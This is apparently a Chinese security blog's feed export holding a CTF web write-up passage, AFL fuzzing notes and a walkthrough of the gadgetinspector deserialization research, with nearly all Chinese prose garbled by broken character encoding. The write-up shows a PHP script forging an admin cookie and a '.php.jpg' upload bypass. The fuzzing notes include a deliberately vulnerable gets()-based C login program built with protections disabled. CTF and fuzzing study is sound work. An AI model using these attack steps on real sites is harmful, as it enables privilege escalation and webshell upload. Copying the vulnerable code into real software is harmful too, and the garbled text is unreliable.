src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193047923.png" alt="1571193047923"></p><p>è®¿é—®<code>/web/index.php?r=site/loginuser_1</code>å‘ç°æœ‰ä¸€æ®µæ³¨é‡Šï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193204265.png" alt="1571193204265"></p><p>åˆ°Githubæœç´¢å…³é”®è¯ï¼Œèƒ½çœ‹åˆ°æ›´å¤šçš„æç¤ºï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193458794.png" alt="1571193458794"></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193530702.png" alt="1571193530702"></p><h2 id="0x02-ååºåˆ—åŒ–å‚ç›´è¶Šæƒ"><a href="#0x02-ååºåˆ—åŒ–å‚ç›´è¶Šæƒ" class="headerlink" title="0x02 ååºåˆ—åŒ–å‚ç›´è¶Šæƒ"></a>0x02 ååºåˆ—åŒ–å‚ç›´è¶Šæƒ</h2><p>çœ‹æç¤ºå¤§æ¦‚æ˜¯è¦ç”¨ååºåˆ—åŒ–åšå‚ç›´è¶Šæƒäº†ï¼š</p><p>å…ˆæŠ“åŒ…ç™»å½•ï¼Œç„¶åcookieå­—æ®µè¢«å¡äº†ä¸€ä¸ªcibå­—æ®µ</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571193790173.png" alt="1571193790173"></p><p>è€ƒè™‘åˆ°æ³¨é‡Šé‡Œé¢ï¼Œsignéœ€è¦çš„idï¼Œnameéƒ½æ˜¯å¯æ§çš„ï¼Œä¼ªé€ ä¸€ä¸ªadminçš„cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'id'</span>=&gt;$id,</span><br><span class="line">                    <span class="string">'name'</span>=&gt;$username,</span><br><span class="line">                    <span class="string">'sign'</span>=&gt;md5($id.$username),</span><br><span class="line">                );</span><br><span class="line"><span class="keyword">echo</span> serialize($sign);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°èº«ä»½å·²ç»æˆç®¡ç†å‘˜äº†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571194732400.png" alt="1571194732400"></p><p>åŠ ä¸€æ¡replaceç»™æµè§ˆå™¨ç”¨ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571194913710.png" alt="1571194913710"></p><h2 id="0x03-ä¸Šä¼ ç»•è¿‡"><a href="#0x03-ä¸Šä¼ ç»•è¿‡" class="headerlink" title="0x03 ä¸Šä¼ ç»•è¿‡"></a>0x03 ä¸Šä¼ ç»•è¿‡</h2><p>ç›´æ¥ä¸Šä¼ .phpä¼šè¢«banï¼Œè€ƒè™‘åˆ°å…¶å®¹å™¨ç”¨çš„Apache/2.2.15ï¼Œå­˜åœ¨è§£ææ¼æ´ï¼Œæ•…ä¸Šä¼ â€œ.php.jpgâ€</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571195205154.png" alt="1571195205154"></p><p>flagåœ¨æ ¹ç›®å½•ä¸‹ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571195383816.png" alt="1571195383816"></p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>æ‰“å¼€é¡µé¢æ˜¯ä¸€ä¸ªè´ªåƒè›‡æ¸¸æˆï¼Œjså†™çš„ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571197503720.png" alt="1571197503720"></p><p><code>/js/game.js</code>ä»£ç å®¡è®¡ï¼Œçœ‹åˆ°ä¸€ä¸²é¢œæ–‡å­—ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571197561706.png" alt="1571197561706"></p><p>consoleè¿è¡Œï¼Œè¿”å›å‡flagï¼Œè·Ÿè¿›å»çœ‹åŒ¿åå‡½æ•°ï¼Œå¾—åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571197802703.png" alt="1571197802703"></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>2019å®‰æ’æ¯Webå®‰å…¨æµ‹è¯•å¤§èµ›ç»ƒä¹ èµ›writeupï¼Œ<a href="http://flag0.com/2019/09/27/2019å®‰æ’æ¯Webå®‰å…¨æµ‹è¯•å¤§èµ›ç»ƒä¹ èµ›Writeup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFLè¯•ç”¨ç¬”è®°</title>
      <link href="/fuzz-AFL%E8%AF%95%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/fuzz-AFL%E8%AF%95%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="ç¨‹åºæ’æ¡©-amp-ç¼–è¯‘"><a href="#ç¨‹åºæ’æ¡©-amp-ç¼–è¯‘" class="headerlink" title="ç¨‹åºæ’æ¡©&amp;ç¼–è¯‘"></a>ç¨‹åºæ’æ¡©&amp;ç¼–è¯‘</h2><p>æœ‰é—®é¢˜ç¨‹åº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> login[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Login: \n"</span>);</span><br><span class="line">    gets(login);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Password: \n"</span>);</span><br><span class="line">    gets(passwd);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(login, <span class="string">"root"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(passwd, <span class="string">"1qazxsw2"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted.\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Access Denied.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -fno-stack-protector -z execstack vuln1.c -o vuln1</span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨makeéœ€è¦è®¾ç½®ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/gittup/binutils</span><br><span class="line"><span class="built_in">export</span> CC=afl-gcc</span><br><span class="line"><span class="built_in">export</span> CXX=afl-g++</span><br></pre></td></tr></table></figure><h2 id="å‡†å¤‡è¾“å…¥ç§å­"><a href="#å‡†å¤‡è¾“å…¥ç§å­" class="headerlink" title="å‡†å¤‡è¾“å…¥ç§å­"></a>å‡†å¤‡è¾“å…¥ç§å­</h2><p>åˆ›å»ºè¾“å…¥è¾“å‡ºç›®å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir testcases results</span><br></pre></td></tr></table></figure><p>åœ¨testcasesä¸‹å»ºç«‹ä»¥ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼ŒAFLä¼šè¯»å–æ¯ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œå°†æ¯ä¸€è¡Œè¾“å…¥åˆ°vuln1çš„æ ‡å‡†è¾“å…¥ä¸­ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| test1.txt | test2.txt | test3.txt |</span><br><span class="line">| --------- | --------- | --------- |</span><br><span class="line">| a         | root      | root      |</span><br><span class="line">| a         | a         | 1qazxsw2  |</span><br></pre></td></tr></table></figure></p><h3 id="ç§å­ç²¾ç®€"><a href="#ç§å­ç²¾ç®€" class="headerlink" title="ç§å­ç²¾ç®€"></a>ç§å­ç²¾ç®€</h3><p><strong>afl-cminå·¥å…·</strong>éœ€è¦ä¸€ä¸ªç»™å®šçš„åŒ…å«å¯èƒ½çš„ï¼ˆpotentialï¼‰test caseçš„æ–‡ä»¶å¤¹ï¼Œç„¶åè¿è¡Œæ¯ä¸€ä¸ªå¹¶å°†æ”¶åˆ°çš„åé¦ˆä¸æ‰€æœ‰å…¶ä»–çš„test caseè¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾åˆ°æœ€æœ‰æ•ˆåœ°è¡¨ç¤ºæœ€uniqueçš„ä»£ç è·¯å¾„çš„æœ€å¥½çš„test caseã€‚æœ€å¥½çš„test caseè¢«ä¿å­˜åˆ°ä¸€ä¸ªæ–°çš„ç›®å½•ã€‚</p><p> <strong>afl-tminå·¥å…·</strong>åªç”¨äºä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶ã€‚å½“æˆ‘ä»¬è¿›è¡Œfuzzingæ—¶ï¼Œæˆ‘ä»¬ä¸æƒ³æµªè´¹CPUæ¥å¤„ç†ä¸€äº›ç›¸å¯¹äºtest caseè¡¨ç¤ºä»£ç è·¯å¾„æ¥è¯´æ— ç”¨çš„bitæˆ–byteã€‚ä¸ºäº†ä½¿æ¯ä¸€ä¸ªtest caseè¾¾åˆ°è¡¨ç¤ºä¸åŸå§‹æµ‹è¯•ç”¨ä¾‹ç›¸åŒçš„ä»£ç è·¯å¾„æ‰€éœ€çš„æœ€å°å€¼ï¼Œafl-tminéå†test caseçš„å®é™…å­—èŠ‚ï¼Œé€æ­¥åˆ é™¤å¾ˆå°çš„æ•°æ®å—ï¼Œç›´åˆ°åˆ é™¤ä»»æ„å­—èŠ‚éƒ½ä¼šå½±å“åˆ°ä»£ç è·¯å¾„è¡¨ç¤ºã€‚</p><h2 id="å¯åŠ¨AFL"><a href="#å¯åŠ¨AFL" class="headerlink" title="å¯åŠ¨AFL"></a>å¯åŠ¨AFL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt; /proc/sys/kernel/core_pattern <span class="comment"># WSLä¸éœ€è¦</span></span><br><span class="line">afl-fuzz -i ./testcases/ -o ./results/ ./vuln1</span><br></pre></td></tr></table></figure><p>å¦‚æœç¨‹åºé€šè¿‡å‚æ•°è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥ç”¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i afl_in -o afl_out ./binutils/readelf -a @@</span><br></pre></td></tr></table></figure></p><p>å‡ºç°ä»¥ä¸‹ç•Œé¢</p><p><img src="/fuzz-AFLè¯•ç”¨ç¬”è®°/1567758115844.png" alt="1567758115844"></p><h2 id="æŸ¥çœ‹crash"><a href="#æŸ¥çœ‹crash" class="headerlink" title="æŸ¥çœ‹crash"></a>æŸ¥çœ‹crash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls results/crashes/ -al</span><br><span class="line">total 4</span><br><span class="line">drwx------ 1 root root 512 Sep  6 16:22 .</span><br><span class="line">drwxrwxrwx 1 root root 512 Sep  6 16:21 ..</span><br><span class="line">-rw------- 1 root root 611 Sep  6 16:21 fuzz-AFLè¯•ç”¨ç¬”è®°.txt</span><br><span class="line">-rw------- 1 root root 137 Sep  6 16:21 id:000000,sig:11,src:000000,op:havoc,rep:64</span><br><span class="line">-rw------- 1 root root  65 Sep  6 16:22 id:000001,sig:11,src:000002,op:havoc,rep:128</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat results/crashes/id:000000,sig:11,src:000000,op:havoc,rep:64</span><br></pre></td></tr></table></figure></p><h1 id="kelinci"><a href="#kelinci" class="headerlink" title="kelinci"></a>kelinci</h1><h2 id="AFLç«¯"><a href="#AFLç«¯" class="headerlink" title="AFLç«¯"></a>AFLç«¯</h2><p>ä¸€ä¸ªCç¨‹åºä½œä¸ºæ¥å£ï¼Œå®ƒä¸afl-gcc/g++ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºç›¸åŒï¼Œå°†AFLçš„è¾“å…¥é€šè¿‡TCPå‘é€ç»™Javaï¼Œå†å°†æ‰§è¡Œç»“æœè¿”å›è¿”å›ç»™aflã€‚åœ¨<code>fuzzerside/</code>ä¸‹ç”¨<code>make</code>ç¼–è¯‘</p><h2 id="JAVAç«¯"><a href="#JAVAç«¯" class="headerlink" title="JAVAç«¯"></a>JAVAç«¯</h2><p>ç”¨äºåŒ…è£…fuzzå¯¹è±¡ï¼Œå»ºç«‹ä¸€ä¸ªTCPæœåŠ¡å™¨ï¼Œè¿”å›é€€å‡ºä»£ç å’Œè·¯å¾„ä¿¡æ¯ã€‚å®ƒåœ¨<code>instrumentor/</code>ç›®å½•ä¸‹ç”¨<code>gradle build</code>æ„å»º</p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Automated Discovery of Deserialization Gadget Chainè§£è¯»</title>
      <link href="/deserialize-AutoFindPOP/"/>
      <url>/deserialize-AutoFindPOP/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« æ¥è‡ªAutomated Discovery of Deserialization Gadget Chains, Blackhat2018</p><p>æ–‡ç« ï¼š<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></p><a id="more"></a><p>æ¼”è®²è§†é¢‘ï¼š<a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> </p><p>å·¥å…·ï¼š<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><h1 id="åŸç†ä»‹ç»"><a href="#åŸç†ä»‹ç»" class="headerlink" title="åŸç†ä»‹ç»"></a>åŸç†ä»‹ç»</h1><p>çœ‹ä¸‹æ¥çš„æ„Ÿè§‰å°±æ˜¯å°†jaråŒ…é‡Œçš„ï¼ˆå¯ä»¥ååºåˆ—åŒ–çš„ï¼‰æ‰€æœ‰ç±»çš„å±æ€§è®¾ä¸ºæ±¡ç‚¹ï¼ˆå› ä¸ºååºåˆ—åŒ–æ—¶æ”»å‡»è€…éƒ½å¯ä»¥æ§åˆ¶ï¼‰ï¼Œæ¥ä¸‹æ¥åšæ±¡ç‚¹ä¼ æ’­ï¼ŒSourceä¸ºtoString()ï¼Œequals()ç­‰æ–¹æ³•ï¼ŒSinkä¸ºRuntime.exec()ï¼ŒMethod.invoke()ï¼ŒURL.openStreamç­‰æ–¹æ³•ï¼Œè€Œæ±¡ç‚¹æ¸…é™¤å‡½æ•°å°±æ˜¯é»‘åå•ç±»ä¸­çš„æ‰€æœ‰å‡½æ•°ã€‚</p><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>æšä¸¾åŒ…å†…çš„æ‰€æœ‰ç±»å’Œæ–¹æ³•ï¼Œå¯¹äºç±»æ”¶é›†å…¶çˆ¶ç±»å’Œå­ç±»é›†åˆï¼š</p><p><img src="/deserialize-AutoFindPOP/1566118462274.png" alt="1566118462274"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;ClassReference&gt; discoveredClasses</span><br><span class="line">ClassReference(name, superClass, interfaces isInterface, members)</span><br><span class="line">ClassReference.Handle(name)</span><br><span class="line">List&lt;MethodReference&gt; discoveredMethod</span><br><span class="line">MethodReference(classReference, name, desc, isStatic)</span><br><span class="line">MethodReference.Handle(classReference, name, desc)</span><br><span class="line">InheritanceMap //è®°å½•äº†ä¸€ä¸ªç±»çš„çˆ¶ç±»å’Œå­ç±»é›†åˆï¼Œå› ä¸ºä¸€ä¸ªç±»æ‹¥æœ‰å…¶çˆ¶ç±»çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap</span><br></pre></td></tr></table></figure><h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>å‘ç°å‡½æ•°ä¼ é€’çš„æ•°æ®æµï¼Œå¦‚ä»£ç æ®µ1ä¸­invokeå¯ä»¥ä¼ é€’å¯¹è±¡value(0)ï¼Œä»£ç æ®µ2ä¸­invokeæ—¢å¯ä»¥ä¼ é€’arg(1)ä¹Ÿå¯ä»¥ä¼ é€’value(0)ï¼Œå› ä¸ºæˆ‘ä»¬å‡è®¾ï¼ˆaï¼‰å—æ±¡æŸ“çš„å¯¹è±¡ä¸­ï¼Œæ‰€æœ‰æˆå‘˜å˜é‡éƒ½æ˜¯å—æ±¡æŸ“çš„ï¼ˆbï¼‰ç¨‹åºä¸­æ‰€æœ‰åˆ†æ”¯éƒ½æ˜¯å¯è¾¾çš„ï¼ˆæ±¡æŸ“ä¼ æ’­éƒ½æ˜¯è¿™æ ·åšçš„ï¼‰ï¼Œ0å’Œ1ä¸ºå‚æ•°indexï¼Œ0ä»£è¡¨thisã€‚åœ¨æ­¤ä¹‹å‰è¦å…ˆåˆ†æå‡½æ•°è°ƒç”¨å…³ç³»ï¼Œå› ä¸ºå¦‚æœæœ‰Aå‡½æ•°ï¼š<code>FuncA(){return FuncB();}</code>ï¼Œé‚£ä¹ˆAå‡½æ•°çš„è¿”å›ä¸Bå‡½æ•°æœ‰å…³ã€‚</p><p><img src="/deserialize-AutoFindPOP/1566118415853.png" alt="1566118415853"></p><p>output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow</span><br><span class="line">MethodReferenceHandle(classReference, name, desc)</span><br><span class="line">Set&lt;Integer&gt; // è¿”å›ä¸€ç³»åˆ—æ±¡ç‚¹ 0è¡¨ç¤ºthisï¼Œ1ä¸ºarg1</span><br></pre></td></tr></table></figure><h2 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h2><p>æ„å»ºè°ƒç”¨å›¾ï¼Œå³å‡½æ•°Aå°†è‡ªèº«å‚æ•°arg1ä¼ é€’ç»™å‡½æ•°Bçš„å‚æ•°arg2 FuncA@1-&gt;FuncB@2</p><p><img src="/deserialize-AutoFindPOP/1566118496226.png" alt="1566118496226"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;GraphCall&gt; discoveredCalls</span><br><span class="line">GraphCall(caller.Method, targetMethod, callerArgIndex, callerargPath, targetArgIndex)</span><br><span class="line">// è°ƒç”¨å‡½æ•°, è¢«è°ƒå‡½æ•°, è°ƒç”¨å‡½æ•°ä¼ é€’å‚æ•°idxï¼Œè·¯å¾„ï¼Œè¢«è°ƒå‡½æ•°ä¼ å…¥å‚æ•°idx</span><br></pre></td></tr></table></figure><p>æ„å›¾æ—¶ï¼Œåªè€ƒè™‘å­˜åœ¨æ±¡ç‚¹çš„è¾¹ï¼š</p><p><img src="/deserialize-AutoFindPOP/1566215882715.png" alt="1566215882715"></p><p>è¿™é‡Œå‘ç°gadgetinspector.TaintTrackingMethodVisitor#getStackTaintæœ‰ç‚¹é—®é¢˜ï¼Œæ¯æ¬¡getçš„æ—¶å€™å¹¶æœªæ‹¿åˆ°Taint</p><h2 id="Step4"><a href="#Step4" class="headerlink" title="Step4"></a>Step4</h2><p>æšä¸¾å…¥å£ï¼Œå¦‚hashCodeï¼ŒtoStringï¼Œç¨‹åºåªèƒ½å‘ç°å·²çŸ¥å…¥å£çš„POPé“¾</p><p><img src="/deserialize-AutoFindPOP/1566120657753.png" alt="1566120657753"></p><p>Outputï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Source&gt; discoveredSources</span><br><span class="line">Source(sourceMethod, taintedArgIndex) <span class="comment">//index0=this</span></span><br></pre></td></tr></table></figure><h2 id="Step5"><a href="#Step5" class="headerlink" title="Step5"></a>Step5</h2><p>BFSæœç´¢å›¾æ‰¾åˆ°chains</p><p><img src="/deserialize-AutoFindPOP/1566302159606.png" alt="1566302159606"></p><h1 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h1><p>æ–­ç‚¹æ‰“gadgetinspector.GadgetInspector#main</p><h2 id="æ±¡ç‚¹ä¼ æ’­ï¼ˆStep2-Step3ï¼‰"><a href="#æ±¡ç‚¹ä¼ æ’­ï¼ˆStep2-Step3ï¼‰" class="headerlink" title="æ±¡ç‚¹ä¼ æ’­ï¼ˆStep2-Step3ï¼‰"></a>æ±¡ç‚¹ä¼ æ’­ï¼ˆStep2-Step3ï¼‰</h2><p>Step2-Step3éƒ½æ˜¯é€šè¿‡ASMåšçš„ï¼Œä¾‹å¦‚Step3ï¼š</p><p><img src="/deserialize-AutoFindPOP/1566214430085.png" alt="1566214430085"></p><p>å…¶ä¸­ç»§æ‰¿äº†åŸºæœ¬Visitorï¼š</p><p>gadgetinspector.TaintTrackingMethodVisitorï¼Œè¯¥ç±»æ¨¡æ‹Ÿå‡½æ•°æ‰§è¡Œï¼Œä¸»è¦æ±¡ç‚¹ä¼ æ’­é€»è¾‘éƒ½åœ¨è¿™</p><h3 id="visitMethodInsn"><a href="#visitMethodInsn" class="headerlink" title="visitMethodInsn"></a>visitMethodInsn</h3><p>å­—èŠ‚ç è°ƒç”¨å‡½æ•°æ—¶ä¼šè§¦å‘è¯¥å‡½æ•°ï¼Œå¯¹äºæ±¡ç‚¹ä¼ æ’­è€Œè¨€ï¼Œåº”è¯¥åšå¦‚ä¸‹äº‹æƒ…</p><ul><li>ä»å †æ ˆå–å‡ºå‚æ•°</li><li>æ£€æŸ¥å‡½æ•°çš„å‚æ•°æ˜¯å¦å­˜åœ¨æ±¡ç‚¹</li><li>è¿”å›å‡½æ•°ç»“æœæ˜¯å¦å­˜åœ¨æ±¡ç‚¹</li><li>å°†ç»“æœæ¨å…¥å †æ ˆ</li></ul><p>å®é™…ä¸Šå°±æ˜¯æ¨¡æ‹Ÿäº†ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼Œå¦‚æœå‡½æ•°ä¸­æœ‰åµŒå¥—è°ƒç”¨é‚£ä¹ˆæƒ…å†µä¼šæ›´å¤æ‚</p><p>å…¶å±æ€§savedVariableState.StackVarsè®°å½•ç€å‡½æ•°å‚æ•°ï¼ŒåŠå…¶æ˜¯å¦æœ‰æ±¡ç‚¹ï¼š</p><p><img src="/deserialize-AutoFindPOP/1567047086609.png" alt="1567047086609"></p><p>å¦‚ä¸Šå›¾ï¼Œè¯¥å‡½æ•°ï¼ˆStringBuilder.append()ï¼‰æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯thisï¼Œæœ‰æ±¡ç‚¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ— æ±¡ç‚¹ã€‚</p><h3 id="ç‰¹æ®Šçš„ä¼ æ’­"><a href="#ç‰¹æ®Šçš„ä¼ æ’­" class="headerlink" title="ç‰¹æ®Šçš„ä¼ æ’­"></a>ç‰¹æ®Šçš„ä¼ æ’­</h3><p>åœ¨gadgetinspector.TaintTrackingMethodVisitor#PASSTHROUGH_DATAFLOWå¤„å®šä¹‰äº†ä¸€äº›ç‰¹æ®Šçš„ä¼ æ’­ï¼Œä¿è¯æ±¡ç‚¹èƒ½å¤Ÿå‘åä¼ æ’­ï¼Œæ¯”å¦‚è¯´Stringç±»å‹<code>A+Taint</code>çš„ä¼ æ’­ï¼Œidx1ï¼Œidx2ï¼Œidx3åˆ†åˆ«æ˜¯ç±»ï¼Œå‡½æ•°åï¼Œå‡½æ•°ç­¾åï¼Œåé¢æ˜¯èƒ½å¤Ÿä¼ æ’­çš„æ±¡ç‚¹å‚æ•°idxï¼Œå¦‚StringBuilder.append()ä¼šå°†å‚æ•°0ï¼Œå‚æ•°1ä¼ æ’­ï¼š</p><p><img src="/deserialize-AutoFindPOP/1566974563078.png" alt="1566974563078"></p><p>è€Œgadgetinspector.TaintTrackingMethodVisitor#visitMethodInsnè¿™é‡Œéœ€è¦å¤„ç†å‡½æ•°å‚æ•°è°ƒç”¨ä¼ æ’­æ±¡ç‚¹çš„æƒ…å†µï¼Œå¦‚<code>A(B(xxx))</code></p><h2 